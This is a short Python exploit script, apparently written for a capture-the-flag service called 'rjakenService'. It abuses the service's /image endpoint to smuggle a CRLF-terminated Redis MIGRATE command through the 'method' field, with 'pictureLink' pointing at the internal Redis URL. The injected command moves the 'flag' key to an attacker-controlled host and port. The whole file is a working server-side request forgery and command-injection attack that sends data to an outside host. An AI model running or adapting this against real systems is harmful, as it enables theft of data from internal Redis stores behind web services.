#!/usr/bin/env python3
import requests
from argparse import ArgumentParser


def parse_args():
    parser = ArgumentParser()
    parser.add_argument(
        '--migrate-to-host',
        required=True,
        type=str,
        help='destination host of redis MIGRATE command, you need to listen some port on this host to retrieve data',
    )
    parser.add_argument(
        '--migrate-to-port',
        required=False,
        default=6379,
        type=int,
        help='port, that you are listening on destination host (6379 by default)',
    )
    parser.add_argument(
        '--service-url',
        required=True,
        type=str,
        help='host of the rjakenService',
    )
    parser.add_argument(
        '--redis-url',
        required=False,
        default='http://redis:6379',
        type=str,
        help='url to redis in internal network of service (http://redis:6379 by default)'
    )

    return parser.parse_args()


def main():
    args = parse_args()
    payload = f'MIGRATE {args.migrate_to_host} {args.migrate_to_port} flag 0 1000\r\n'

    resp = requests.post(f'{args.service_url}/image', json={
        'pictureLink': args.redis_url,
        'method': payload,
    })

    print(resp.text)


if __name__ == '__main__':
    main()
